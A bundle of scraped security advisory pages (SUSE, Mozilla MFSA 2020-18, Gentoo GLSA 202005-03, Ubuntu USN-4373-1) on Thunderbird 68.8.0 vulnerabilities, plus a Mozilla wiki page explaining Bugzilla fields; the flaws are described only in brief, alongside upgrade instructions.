| SUSE Linux Enterprise Server 10 SP4-LTSS | MozillaFirefox | Ignore |
| SUSE Linux Enterprise Server 11 SP1-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP2-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP3-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 11 SP4 LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 11 SP4-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP1 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP1-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP2-BCL | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP2-ESPOS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP2-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP3-BCL | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP3-ESPOS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP3-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP4 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP4-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP4-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 | MozillaThunderbird | Affected |
| SUSE Linux Enterprise Server 15 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 15 SP1 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Server 15 SP1-BCL | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP1-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP2-BCL | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP3-BCL | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15-LTSS | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 12 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP3 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP4 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 15 | MozillaThunderbird | Affected |
| SUSE Linux Enterprise Server for SAP Applications 15 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 SP1 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Software Development Kit 11 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 11 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 12 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 12 SP1 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 12 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 12 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Software Development Kit 12 SP4 | MozillaFirefox | Released |
| SUSE Linux Enterprise Software Development Kit 12 SP5 | MozillaFirefox | Released |
| SUSE Linux Enterprise Workstation Extension 15 | MozillaThunderbird | Affected |
| SUSE Linux Enterprise Workstation Extension 15 SP1 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Workstation Extension 15 SP2 | MozillaThunderbird | Released |
| SUSE Manager Proxy 4.0 | MozillaFirefox | Released |
| SUSE Manager Proxy 4.1 | MozillaFirefox | Released |
| SUSE Manager Proxy 4.2 | MozillaFirefox | Affected |
| SUSE Manager Retail Branch Server 4.0 | MozillaFirefox | Released |
| SUSE Manager Retail Branch Server 4.1 | MozillaFirefox | Released |
| SUSE Manager Retail Branch Server 4.2 | MozillaFirefox | Affected |
| SUSE Manager Server 4.0 | MozillaFirefox | Released |
| SUSE Manager Server 4.1 | MozillaFirefox | Released |
| SUSE Manager Server 4.2 | MozillaFirefox | Affected |
| SUSE OpenStack Cloud 7 | MozillaFirefox | Released |
| SUSE OpenStack Cloud 8 | MozillaFirefox | Released |
| SUSE OpenStack Cloud 9 | MozillaFirefox | Affected |
| SUSE OpenStack Cloud Crowbar 8 | MozillaFirefox | Released |
| SUSE OpenStack Cloud Crowbar 9 | MozillaFirefox | Affected |
| SUSE Package Hub 15 SP1 | chromium | Released |
| openSUSE Leap 15.3 | MozillaFirefox | Affected |
| openSUSE Leap 15.4 | MozillaFirefox | Affected |

---

### SUSE Timeline for this CVE

CVE page created: Tue May 5 15:19:11 2020

CVE page last modified: Fri Dec 20 23:01:44 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)
* [![](https://www.suse.com/assets/img/icons/bsky-icon.png)](https://bsky.app/profile/suse.com)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from www.mozilla.org_d9d49924_20250119_135952.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-18

## Security Vulnerabilities fixed in Thunderbird 68.8.0

Announced
May 5, 2020
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 68.8

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2020-12397: Sender Email Address Spoofing using encoded Unicode characters](#CVE-2020-12397)

Reporter
Ahmed Elsobky (@0xSobky)
Impact
low
##### Description

By encoding Unicode whitespace characters within the From
email header, an attacker can spoof the sender email address
that Thunderbird displays.

##### References

* [Bug 1617370](https://bugzilla.mozilla.org/show_bug.cgi?id=1617370)

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Thunderbird 68.8.0](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 68.8.0](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_3659d679_20250119_135949.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from security.gentoo.org_921c59c5_20250119_122047.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Thunderbird: Multiple vulnerabilities — GLSA **202005-03**

Multiple vulnerabilities have been found in Mozilla Thunderbird,
the worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **mail-client/thunderbird** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

| Package | **mail-client/thunderbird-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

### Background

Mozilla Thunderbird is a popular open-source email client from the
Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Thunderbird.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker may be able to execute arbitrary code, cause a Denial
of Service condition or spoof sender email address.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Thunderbird users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=mail-client/thunderbird-68.8.0"

```

All Mozilla Thunderbird binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=mail-client/thunderbird-bin-68.8.0"

```
### References

* [CVE-2020-12387](https://nvd.nist.gov/vuln/detail/CVE-2020-12387)
* [CVE-2020-12392](https://nvd.nist.gov/vuln/detail/CVE-2020-12392)
* [CVE-2020-12395](https://nvd.nist.gov/vuln/detail/CVE-2020-12395)
* [CVE-2020-12397](https://nvd.nist.gov/vuln/detail/CVE-2020-12397)
* [CVE-2020-6831](https://nvd.nist.gov/vuln/detail/CVE-2020-6831)
* [MFSA-2020-18](https://www.mozilla.org/en-US/security/advisories/mfsa2020-18/)

**Release date**

May 12, 2020

**Latest revision**

May 12, 2020: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [721324](https://bugs.gentoo.org/show_bug.cgi?id=721324)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from usn.ubuntu.com_80859124_20250119_122048.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4373-1: Thunderbird vulnerabilities

26 May 2020

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 20.04 LTS](/security/notices?release=focal)
* [Ubuntu 19.10](/security/notices?release=eoan)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

